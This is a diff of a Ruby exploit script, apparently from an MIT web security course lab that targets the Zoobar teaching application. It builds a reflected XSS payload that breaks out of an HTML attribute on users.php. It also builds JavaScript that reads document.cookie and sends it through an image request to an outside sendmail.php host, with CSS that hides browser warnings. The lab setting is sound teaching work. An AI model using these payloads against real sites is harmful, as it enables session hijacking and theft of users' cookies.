@@ -13,7 +13,7 @@ def html_encode(string)
 end
 
 def part1(exploit)
-  'http://zoobar.csail.mit.edu/users.php?user=' +
+  'http://localhost/zoobar/users.php?user=' +
       uri_encode(%Q|" size="10">#{exploit}<div style="display:none;" xx="|)
 end
 
@@ -26,9 +26,9 @@ end
 def session_exploit_js
   url = 'http://pdos.csail.mit.edu/6.893/2009/labs/lab3/sendmail.php'
   addr = 'costan@mit.edu'
-  "(new Image()).src='#{url}?to=#{addr}&" +
-      "payload='+encodeURIComponent" +
-      "(document.cookie)+'&random='+Math.random();"
+  "(new Image()).src='#{url}?to=#{addr}&payload='" +
+      "+encodeURIComponent(document.cookie)" +
+      "+'&random='+Math.random();"
 end
 # END:exploit
 
@@ -36,10 +36,9 @@ def js_html_wrapper(js)
   %Q|<script type="text/javascript"><!--\n| + js + %Q|\n// --></script>|
 end
 
-
 def session_exploit_html
   '<style type="text/css">.warning{display:none;}</style>' +
-      js_html_wrapper(uri_encode(session_exploit_js))
+      js_html_wrapper(session_exploit_js)
 end
 
 if __FILE__ == $0
